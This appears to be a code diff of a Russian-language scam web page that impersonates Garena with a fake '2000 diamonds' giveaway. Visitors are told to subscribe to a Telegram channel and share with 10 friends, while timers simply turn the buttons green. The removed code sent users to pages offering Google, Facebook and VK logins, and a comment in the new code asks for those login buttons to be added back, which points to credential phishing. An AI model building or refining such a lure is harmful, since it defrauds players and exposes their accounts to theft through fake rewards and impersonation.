@@ -3,24 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Задание для выполнения</title>
+  <title>Раздача алмазов от Garena</title>
   <style>
     body {
-      font-family: 'Roboto', Arial, sans-serif;
-      background-color: #1a1a1a;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       margin: 0;
-      position: relative;
-      overflow: hidden;
+      padding: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      overflow-x: hidden;
+      background: linear-gradient(135deg, #1a1a1a, #333);
+      color: white;
     }
 
-    /* Фоновое видео */
-    video {
-      position: absolute;
+    .video-background {
+      position: fixed;
       top: 0;
       left: 0;
       width: 100%;
@@ -29,52 +24,42 @@
       z-index: -1;
     }
 
-    .main-container {
-      text-align: center;
+    .main-content {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
       background-color: rgba(0, 0, 0, 0.8);
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
-      max-width: 600px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+      max-width: 800px;
       width: 90%;
+      text-align: center;
+      margin: 20px auto;
+      overflow: hidden;
     }
 
-    h1 {
-      font-size: 32px;
-      color: #ffd700;
-      margin-bottom: 20px;
-    }
-
-    .task {
+    .task-button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 6px;
       font-size: 18px;
-      margin-bottom: 20px;
-      line-height: 1.6;
-    }
-
-    .action-button {
-      width: 200px;
-      padding: 10px;
-      font-size: 18px;
-      background-color: #ff0000;
-      color: white;
-      border: none;
-      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s, transform 0.2s;
-      margin-bottom: 20px;
+      transition: background-color 0.3s ease;
+      color: white;
+      text-align: center;
+      margin-top: 15px;
     }
 
-    .action-button:hover {
-      background-color: #e60000;
-      transform: scale(1.05);
+    .task-button.waiting {
+      background-color: #ccc;
     }
 
-    .completed {
-      background-color: #28a745;
-      cursor: not-allowed;
+    .task-button.completed {
+      background-color: #4CAF50;
     }
 
     .footer {
+      margin-top: 20px;
       font-size: 14px;
       color: #ccc;
     }
@@ -88,153 +73,90 @@
       text-decoration: underline;
     }
 
-    /* Модальное окно */
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
+    .long-text {
       color: white;
-    }
-
-    .modal-content {
-      background-color: rgba(0, 0, 0, 0.9);
-      padding: 40px;
-      border-radius: 10px;
+      font-size: 16px;
+      margin-top: 30px;
       text-align: center;
+      line-height: 1.6;
     }
 
-    .modal button {
-      width: 200px;
-      padding: 10px;
-      margin: 10px;
-      font-size: 18px;
-      background-color: #ffd700;
-      color: #1a1a1a;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
+    .info-section {
+      margin-top: 30px;
+      padding: 20px;
+      background-color: rgba(255, 215, 0, 0.1);
+      border-radius: 10px;
+      text-align: left;
     }
 
-    .modal button:hover {
-      background-color: #ffcc00;
+    .info-section h2 {
+      color: #ffd700;
+      font-size: 24px;
+      margin-bottom: 10px;
     }
 
-    .share-button {
-      background-color: #1d8be8;
+    .info-section p {
+      font-size: 16px;
+      line-height: 1.6;
     }
 
-    .share-button:hover {
-      background-color: #1a78c2;
+    @media (max-width: 768px) {
+      .task-button {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
 
-  <video autoplay loop muted>
+  <video class="video-background" autoplay loop muted playsinline>
     <source src="video.mp4" type="video/mp4">
-    Your browser does not support the video tag.
+    Ваш браузер не поддерживает видео.
   </video>
 
-  <div class="main-container">
-    <h1>Задание для выполнения и получение алмазов</h1>
-    <div class="task">
-      <p><strong>Мы даем алмазы за выполнение простого задания!</strong></p>
-      <p>Для получения 2000 алмазов нужно выполнить следующие шаги:</p>
-      <ol>
-        <li>Перейдите по <a href="https://t.me/your_telegram_channel" target="_blank" style="color: #ffd700;">ссылке</a> и подпишитесь на наш канал в Telegram.</li>
-        <li>После подписки на канал подождите 15 секунд, и кнопка для выполнения задания станет зеленой.</li>
-        <li>Как только все кнопки станут зелеными, они исчезнут, и появится окно с информацией о том, что вы забрали свои 2000 алмазов!</li>
-      </ol>
-      <p>Внимание! Чтобы получить награду, необходимо выполнить все шаги правильно.</p>
+  <div class="main-content">
+    <h1>Раздача алмазов от Garena</h1>
+    <p>Мы даем алмазы за выполнение простых заданий! Выполните шаги и получите алмазы на свой аккаунт.</p>
 
-      <a href="https://ify.ac/1YsR" target="_blank">
-        <button class="action-button" id="actionButton1">Перейти и подписаться</button>
-      </a>
+    <div class="long-text">
+      <p>Для того, чтобы получить 2000 алмазов, выполните следующее задание:</p>
+    </div>
 
-      <a href="https://ify.ac/1YsR" target="_blank">
-        <button class="action-button" id="actionButton2">Перейти и подписаться</button>
-      </a>
+    <div id="task-1">
+      <button class="task-button" id="task-btn-1" onclick="completeTask('task-1')">Перейти по ссылке и подписаться на Telegram канал</button>
+    </div>
 
-      <a href="https://ify.ac/1YsR" target="_blank">
-        <button class="action-button" id="actionButton3">Перейти и подписаться</button>
-      </a>
+    <div id="task-2">
+      <button class="task-button" id="task-btn-2" onclick="completeTask('task-2')">Поделиться с 10 друзьями</button>
+    </div>
 
-      <div id="timerMessage" style="display: none; color: #28a745; font-size: 18px;">Спасибо за подписку! Кнопка будет активирована через 15 секунд.</div>
-
-      <!-- Кнопка для задания поделиться с друзьями -->
-      <div class="task">
-        <p>Поделитесь с 10 друзьями, чтобы получить еще больше алмазов!</p>
-        <button class="action-button share-button" onclick="shareMessage()">Поделиться с друзьями</button>
-      </div>
+    <div class="long-text">
+      <p>Как только все кнопки станут зелеными, они исчезнут, и появится окно с вашим призом!</p>
     </div>
 
     <div class="footer">
-      <p>После подписки ждите 15 секунд, и кнопки станут зелеными. Не забывайте следовать инструкциям!</p>
-    </div>
-  </div>
-
-  <!-- Модальное окно -->
-  <div id="rewardModal" class="modal">
-    <div class="modal-content">
-      <h2>Вы забрали 2000 алмазов!</h2>
-      <p>Теперь выберите способ входа:</p>
-      <button onclick="location.href='login-google.html'">Войти через Google</button>
-      <button onclick="location.href='login-facebook.html'">Войти через Facebook</button>
-      <button onclick="location.href='login-vk.html'">Войти через VK</button>
+      <p>Официальные контакты Garena:</p>
+      <p>
+        <a href="https://www.garena.sg" target="_blank">Сайт</a> | 
+        <a href="https://www.facebook.com/garena" target="_blank">Facebook</a> | 
+        <a href="https://twitter.com/garena" target="_blank">Twitter</a>
+      </p>
     </div>
   </div>
 
   <script>
-    const actionButtons = document.querySelectorAll('.action-button');
-    let completedCount = 0;
+    function completeTask(taskId) {
+      const taskButton = document.getElementById('task-btn-' + taskId.charAt(taskId.length - 1));
+      taskButton.classList.remove('waiting');
+      taskButton.classList.add('completed');
+      taskButton.innerText = 'Задание выполнено!';
 
-    // Функция для изменения кнопки и появления модального окна
-    function checkButtons() {
-      completedCount = 0;
-      actionButtons.forEach(button => {
-        if (button.classList.contains('completed')) {
-          completedCount++;
-        }
-      });
-
-      // Если все кнопки завершены, показываем модальное окно
-      if (completedCount === actionButtons.length) {
+      if (document.querySelectorAll('.completed').length === 2) {
         setTimeout(() => {
-          document.getElementById('rewardModal').style.display = 'flex';
-        }, 500);
+          alert('Вы забрали 2000 алмазов!');
+          // Здесь добавьте логику для отображения кнопок для входа в систему
+        }, 2000);
       }
-    }
-
-    // Слушатель событий для каждой кнопки
-    actionButtons.forEach(button => {
-      button.addEventListener('click', function() {
-        // Показать сообщение
-        document.getElementById('timerMessage').style.display = 'block';
-
-        // Через 15 секунд меняем цвет кнопки на зеленый
-        setTimeout(function() {
-          button.classList.add('completed');
-          button.textContent = 'Задание выполнено';
-          checkButtons(); // Проверка всех кнопок
-        }, 15000); // 15 секунд
-      });
-    });
-
-    // Функция для генерации сообщения в Telegram
-    function shareMessage() {
-      const message = encodeURIComponent(
-        'Мы даем алмазы за выполнение простого задания! Поделитесь с 10 друзьями и получите 2000 алмазов. Перейдите по ссылке и подпишитесь на наш канал в Telegram: https://your-site-link.com'
-      );
-      const telegramUrl = `https://t.me/share/url?url=${message}`;
-
-      // Открытие Telegram с готовым сообщением
-      window.open(telegramUrl, '_blank');
     }
   </script>
 
